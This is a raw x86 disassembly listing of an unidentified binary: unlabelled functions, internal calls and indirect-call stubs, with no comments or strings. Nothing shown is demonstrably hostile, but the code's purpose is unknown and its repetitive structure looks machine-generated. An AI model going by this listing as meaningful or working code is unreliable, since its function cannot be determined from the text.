  4d10b1:	push   edi
  4d10b2:	push   eax
  4d10b3:	call   0x4d1318
  4d10b8:	add    esp,0x10
  4d10bb:	pop    ecx
  4d10bc:	push   ecx
  4d10bd:	mov    edx,0xfffffff4
  4d10c2:	push   edx
  4d10c3:	call   0x4d1374
  4d10c8:	add    esp,0x4
  4d10cb:	pop    ecx
  4d10cc:	push   ecx
  4d10cd:	call   0x4d07a8
  4d10d2:	add    esp,0x4
  4d10d5:	pop    ecx
  4d10d6:	add    esp,0x54
  4d10d9:	pop    ebp
  4d10da:	ret    
  4d10db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10e1:	sub    esp,0x28
  4d10e4:	lea    ebx,ds:0x4d31f0
  4d10ea:	mov    eax,DWORD PTR [ebx-0x108]
  4d10f0:	push   ebx
  4d10f1:	push   DWORD PTR [ebx+0x1c4]
  4d10f7:	push   edi
  4d10f8:	call   0x4d1178
  4d10fd:	add    esp,0x8
  4d1100:	pop    ebx
  4d1101:	push   0x0
  4d1103:	call   0x4d0a54
  4d1108:	add    esp,0x4
  4d110b:	mov    ecx,0x0
  4d1110:	push   ecx
  4d1111:	call   0x4d1024
  4d1116:	add    esp,0x4
  4d1119:	add    esp,0x28
  4d111c:	pop    ebp
  4d111d:	ret    
  4d111e:	add    BYTE PTR [eax],al
  4d1120:	pop    edi
  4d1121:	call   DWORD PTR ds:0x4d2094
  4d1127:	call   edi
  4d1129:	add    BYTE PTR [eax],al
  4d112b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1131:	sub    esp,0x54
  4d1134:	lea    ebx,[edx-0xdc]
  4d113a:	cmp    ebx,0x4dc3
  4d1140:	jbe    0x4d112f
  4d1142:	push   ebx
  4d1143:	push   edx
  4d1144:	push   edi
  4d1145:	call   0x4d145c
  4d114a:	add    esp,0x8
  4d114d:	pop    ebx
  4d114e:	push   0x0
  4d1150:	call   0x4d0cb4
  4d1155:	add    esp,0x4
  4d1158:	mov    eax,0x0
  4d115d:	push   eax
  4d115e:	call   0x4d0a54
  4d1163:	add    esp,0x4
  4d1166:	add    esp,0x54
  4d1169:	pop    ebp
  4d116a:	ret    
  4d116b:	add    BYTE PTR [edi-0x1],bl
  4d116e:	adc    eax,0x4d206c
  4d1173:	call   edi
  4d1175:	add    BYTE PTR [eax],al
  4d1177:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d117d:	sub    esp,0x28
  4d1180:	mov    ecx,0x4d30cc
  4d1185:	cmp    ecx,0x45d3
  4d118b:	jb     0x4d117b
  4d118d:	push   ecx
  4d118e:	mov    ecx,0x0
  4d1193:	push   ecx
  4d1194:	call   0x4d0a54
  4d1199:	add    esp,0x4
  4d119c:	pop    ecx
  4d119d:	push   ecx
  4d119e:	push   DWORD PTR [ecx+0x74]
  4d11a1:	push   DWORD PTR [ecx+0x84]
  4d11a7:	push   edx
  4d11a8:	push   DWORD PTR [ecx+0x30]
  4d11ab:	call   0x4d0a78
  4d11b0:	add    esp,0x10
  4d11b3:	pop    ecx
  4d11b4:	push   ecx
  4d11b5:	lea    ebx,[ecx-0xcc]
  4d11bb:	push   ebx
  4d11bc:	call   0x4d08d4
  4d11c1:	add    esp,0x4
  4d11c4:	test   eax,eax
  4d11c6:	jne    0x4d11b5
  4d11c8:	pop    ecx
  4d11c9:	add    esp,0x28
  4d11cc:	pop    ebp
  4d11cd:	ret    
  4d11ce:	add    BYTE PTR [eax],al
  4d11d0:	mov    edi,edi
  4d11d2:	push   ebp
  4d11d3:	mov    ebp,esp
  4d11d5:	sub    esp,0x30
  4d11d8:	lea    edi,ds:0x4d303c
  4d11de:	mov    DWORD PTR [edi+0x1b4],ebx
  4d11e4:	push   edi
  4d11e5:	mov    ebx,0x0
  4d11ea:	push   ebx
  4d11eb:	call   0x4d1024
  4d11f0:	add    esp,0x4
  4d11f3:	pop    edi
  4d11f4:	push   edi
  4d11f5:	push   DWORD PTR [edi+0xc0]
  4d11fb:	push   DWORD PTR [edi+0x9c]
  4d1201:	push   DWORD PTR [edi+0x198]
  4d1207:	push   DWORD PTR [edi+0x1fc]
  4d120d:	call   0x4d0ccc
  4d1212:	add    esp,0x10
  4d1215:	pop    edi
  4d1216:	push   edi
  4d1217:	mov    esi,0x0
  4d121c:	push   esi
  4d121d:	call   0x4d14e4
  4d1222:	add    esp,0x4
  4d1225:	pop    edi
  4d1226:	add    esp,0x30
  4d1229:	pop    ebp
  4d122a:	ret    
  4d122b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1231:	sub    esp,0x5c
  4d1234:	lea    eax,ds:0x4d31b0
  4d123a:	cmp    eax,0x6943
  4d123f:	jbe    0x4d122f
  4d1241:	push   eax
  4d1242:	push   0x0
  4d1244:	call   0x4d0f48
  4d1249:	add    esp,0x4
  4d124c:	pop    eax
  4d124d:	push   eax
  4d124e:	push   edi
  4d124f:	push   ebx
  4d1250:	call   0x4d09c8
  4d1255:	add    esp,0x8
  4d1258:	pop    eax
  4d1259:	push   eax
  4d125a:	call   0x4d1538
  4d125f:	add    esp,0x4
  4d1262:	pop    eax
  4d1263:	add    esp,0x5c
  4d1266:	pop    ebp
  4d1267:	ret    
  4d1268:	mov    edi,edi
  4d126a:	push   ebp
  4d126b:	mov    ebp,esp
  4d126d:	sub    esp,0x30
  4d1270:	lea    ebx,[eax+0x128]
  4d1276:	mov    DWORD PTR [ebp-0x18],edx
  4d1279:	mov    esi,0x0
  4d127e:	push   esi
  4d127f:	call   0x4d0cb4
  4d1284:	add    esp,0x4
  4d1287:	push   ebx
  4d1288:	push   DWORD PTR [ebx+0x1e0]
  4d128e:	push   edi
  4d128f:	push   DWORD PTR [ebx+0x1b8]
  4d1295:	call   0x4d0fe4
  4d129a:	add    esp,0xc
  4d129d:	pop    ebx
  4d129e:	push   0x0
  4d12a0:	call   0x4d0a54
  4d12a5:	add    esp,0x4
  4d12a8:	add    esp,0x30
  4d12ab:	pop    ebp
  4d12ac:	ret    
  4d12ad:	add    BYTE PTR [eax],al
  4d12af:	add    BYTE PTR [edi-0x1],bl
  4d12b2:	adc    eax,0x4d202c
  4d12b7:	call   edi
  4d12b9:	add    BYTE PTR [eax],al
  4d12bb:	add    BYTE PTR [edi-0x1],bl
  4d12be:	adc    eax,0x4d2044
  4d12c3:	call   edi
  4d12c5:	add    BYTE PTR [eax],al
  4d12c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12cd:	sub    esp,0x58
  4d12d0:	lea    ecx,ds:0x4d3000
  4d12d6:	add    DWORD PTR [ecx+0xbc],esi
  4d12dc:	push   ecx
  4d12dd:	push   DWORD PTR [ecx+0xe4]
  4d12e3:	push   edi
  4d12e4:	push   DWORD PTR [ecx+0x8c]
  4d12ea:	call   0x4d10dc
  4d12ef:	add    esp,0xc
  4d12f2:	pop    ecx
  4d12f3:	push   ecx
  4d12f4:	mov    ebx,0x0
  4d12f9:	push   ebx
  4d12fa:	call   0x4d0df8
  4d12ff:	add    esp,0x4
  4d1302:	pop    ecx
  4d1303:	push   ecx
  4d1304:	mov    edi,0x0
  4d1309:	push   edi
  4d130a:	call   0x4d14e4
  4d130f:	add    esp,0x4
  4d1312:	pop    ecx
  4d1313:	add    esp,0x58
  4d1316:	pop    ebp
  4d1317:	ret    
  4d1318:	mov    edi,edi
  4d131a:	push   ebp
  4d131b:	mov    ebp,esp
  4d131d:	sub    esp,0x24
  4d1320:	lea    eax,ds:0x4d3054
  4d1326:	xor    DWORD PTR [ebp-0x14],ebx
  4d1329:	push   eax
  4d132a:	push   DWORD PTR [eax+0x8c]
  4d1330:	push   edx
  4d1331:	call   0x4d0858
  4d1336:	add    esp,0x8
  4d1339:	pop    eax
  4d133a:	push   eax
  4d133b:	mov    ecx,0x0
  4d1340:	push   ecx
  4d1341:	call   0x4d0cb4
  4d1346:	add    esp,0x4
  4d1349:	pop    eax
  4d134a:	push   eax
  4d134b:	call   0x4d0e04
  4d1350:	add    esp,0x4
  4d1353:	pop    eax
  4d1354:	add    esp,0x24
  4d1357:	pop    ebp
  4d1358:	ret    
  4d1359:	add    BYTE PTR [eax],al
  4d135b:	add    BYTE PTR [edi-0x1],bl
  4d135e:	adc    eax,0x4d2034
  4d1363:	call   edi
  4d1365:	add    BYTE PTR [eax],al
  4d1367:	add    BYTE PTR [edi-0x1],bl
  4d136a:	adc    eax,0x4d2010
  4d136f:	call   edi
  4d1371:	add    BYTE PTR [eax],al
  4d1373:	add    BYTE PTR [edi-0x1],bl
  4d1376:	adc    eax,0x4d2048
  4d137b:	call   edi
  4d137d:	add    BYTE PTR [eax],al
  4d137f:	add    BYTE PTR [edi-0x1],bl
  4d1382:	adc    eax,0x4d2014
  4d1387:	call   edi
  4d1389:	add    BYTE PTR [eax],al
  4d138b:	add    BYTE PTR [edi-0x1],bl
  4d138e:	adc    eax,0x4d2078
  4d1393:	call   edi
  4d1395:	add    BYTE PTR [eax],al
  4d1397:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d139d:	sub    esp,0x4c
  4d13a0:	mov    ecx,0x4d3178
  4d13a5:	mov    esi,DWORD PTR [ecx-0x9c]
  4d13ab:	push   ecx
  4d13ac:	mov    ecx,0x0
  4d13b1:	push   ecx
  4d13b2:	call   0x4d0a6c
  4d13b7:	add    esp,0x4
  4d13ba:	pop    ecx
  4d13bb:	push   ecx
  4d13bc:	push   edi
  4d13bd:	push   edi
  4d13be:	push   eax
  4d13bf:	push   DWORD PTR [ecx+0x60]
  4d13c2:	call   0x4d0c24
  4d13c7:	add    esp,0x10
  4d13ca:	pop    ecx
  4d13cb:	push   ecx
  4d13cc:	mov    ebx,0x0
  4d13d1:	push   ebx
  4d13d2:	call   0x4d1024
  4d13d7:	add    esp,0x4
  4d13da:	pop    ecx
  4d13db:	add    esp,0x4c
  4d13de:	pop    ebp
  4d13df:	ret    
  4d13e0:	pop    edi
  4d13e1:	call   DWORD PTR ds:0x4d2084
  4d13e7:	call   edi
  4d13e9:	add    BYTE PTR [eax],al
  4d13eb:	add    BYTE PTR [edi-0x1],bl
  4d13ee:	adc    eax,0x4d203c
  4d13f3:	call   edi
  4d13f5:	add    BYTE PTR [eax],al
  4d13f7:	add    BYTE PTR [edi-0x1],bl
  4d13fa:	adc    eax,0x4d2090
  4d13ff:	call   edi
  4d1401:	add    BYTE PTR [eax],al
  4d1403:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1409:	sub    esp,0x44
  4d140c:	lea    ecx,ds:0x4d30a4
  4d1412:	cmp    ecx,0x89c
  4d1418:	jb     0x4d1407
  4d141a:	push   ecx
  4d141b:	push   DWORD PTR [ecx+0x118]
  4d1421:	push   edi
  4d1422:	push   DWORD PTR [ecx+0x90]
  4d1428:	push   DWORD PTR [ecx+0x98]
  4d142e:	call   0x4d0924
  4d1433:	add    esp,0x10
  4d1436:	pop    ecx
  4d1437:	push   ecx
  4d1438:	mov    edx,0xfffffff4
  4d143d:	push   edx
  4d143e:	call   0x4d1374
  4d1443:	add    esp,0x4
  4d1446:	pop    ecx
  4d1447:	push   ecx
  4d1448:	mov    edx,0x0
  4d144d:	push   edx
  4d144e:	call   0x4d0a54
  4d1453:	add    esp,0x4
  4d1456:	pop    ecx
  4d1457:	add    esp,0x44
  4d145a:	pop    ebp
  4d145b:	ret    
  4d145c:	mov    edi,edi
  4d145e:	push   ebp
  4d145f:	mov    ebp,esp
  4d1461:	sub    esp,0x60
  4d1464:	lea    eax,ds:0x4d3014
  4d146a:	or     esi,DWORD PTR [eax+0xe8]
  4d1470:	push   eax
  4d1471:	push   0x0
  4d1473:	call   0x4d1024
  4d1478:	add    esp,0x4
  4d147b:	pop    eax
  4d147c:	push   eax
  4d147d:	push   DWORD PTR [eax+0x68]
  4d1480:	push   DWORD PTR [eax+0x1c]
  4d1483:	call   0x4d0f98
  4d1488:	add    esp,0x8
  4d148b:	pop    eax
  4d148c:	push   eax
  4d148d:	mov    eax,0x0
  4d1492:	push   eax
  4d1493:	call   0x4d0cc0
  4d1498:	add    esp,0x4
  4d149b:	pop    eax
  4d149c:	add    esp,0x60
  4d149f:	pop    ebp
  4d14a0:	ret    
  4d14a1:	add    BYTE PTR [eax],al
  4d14a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14a9:	sub    esp,0x28
  4d14ac:	lea    edi,ds:0x4d303c
  4d14b2:	xor    edx,0xffffff93
  4d14b5:	push   edi
  4d14b6:	push   ecx
  4d14b7:	push   DWORD PTR [edi+0x174]
  4d14bd:	push   DWORD PTR [edi+0x4]
  4d14c0:	call   0x4d0b50
  4d14c5:	add    esp,0xc
  4d14c8:	pop    edi
  4d14c9:	push   edi
  4d14ca:	push   0x0
  4d14cc:	call   0x4d12b0
  4d14d1:	add    esp,0x4
  4d14d4:	pop    edi
  4d14d5:	push   edi
  4d14d6:	call   0x4d07a8
  4d14db:	add    esp,0x4
  4d14de:	pop    edi
  4d14df:	add    esp,0x28
  4d14e2:	pop    ebp
  4d14e3:	ret    
  4d14e4:	pop    edi
  4d14e5:	call   DWORD PTR ds:0x4d2030
  4d14eb:	call   edi
  4d14ed:	add    BYTE PTR [eax],al
  4d14ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14f5:	sub    esp,0x24
  4d14f8:	mov    edi,0x4d3044
  4d14fd:	adc    esi,DWORD PTR [ebp-0x1c]
  4d1500:	push   edi
  4d1501:	push   0x0
  4d1503:	call   0x4d1080
  4d1508:	add    esp,0x4
  4d150b:	pop    edi
  4d150c:	push   edi
  4d150d:	push   eax
  4d150e:	push   DWORD PTR [edi+0x1b8]
  4d1514:	push   DWORD PTR [edi+0x1cc]
  4d151a:	call   0x4d0730
  4d151f:	add    esp,0xc
  4d1522:	pop    edi
  4d1523:	push   edi
  4d1524:	mov    ebx,0x0
  4d1529:	push   ebx
  4d152a:	call   0x4d1080
  4d152f:	add    esp,0x4
  4d1532:	pop    edi
  4d1533:	add    esp,0x24
  4d1536:	pop    ebp
  4d1537:	ret    
  4d1538:	pop    edi
  4d1539:	call   DWORD PTR ds:0x4d2038
  4d153f:	call   edi
  4d1541:	add    BYTE PTR [eax],al
  4d1543:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1549:	sub    esp,0x30
  4d154c:	lea    ecx,ds:0x4d3118
  4d1552:	add    eax,edi
  4d1554:	push   ecx
  4d1555:	call   0x4d0e04
  4d155a:	add    esp,0x4
  4d155d:	pop    ecx
  4d155e:	push   ecx
  4d155f:	push   DWORD PTR [ecx]
  4d1561:	push   edx
  4d1562:	push   edi
  4d1563:	call   0x4d07fc
  4d1568:	add    esp,0xc
  4d156b:	pop    ecx
  4d156c:	push   ecx
  4d156d:	push   0x0
  4d156f:	call   0x4d0f48
  4d1574:	add    esp,0x4
  4d1577:	pop    ecx
  4d1578:	add    esp,0x30
  4d157b:	pop    ebp
  4d157c:	ret    
  4d157d:	add    BYTE PTR [eax],al
  4d157f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1585:	sub    esp,0x44
  4d1588:	mov    esi,0x4d3134
  4d158d:	sbb    ecx,DWORD PTR [esi+0x14]
  4d1590:	push   esi
  4d1591:	push   DWORD PTR [esi+0x28]
  4d1594:	push   edi
  4d1595:	call   0x4d0f00
  4d159a:	add    esp,0x8
  4d159d:	pop    esi
  4d159e:	push   0x0
  4d15a0:	call   0x4d0f48
  4d15a5:	add    esp,0x4
  4d15a8:	push   0x0
  4d15aa:	call   0x4d14e4
  4d15af:	add    esp,0x4
  4d15b2:	add    esp,0x44
  4d15b5:	pop    ebp
  4d15b6:	ret    
	...
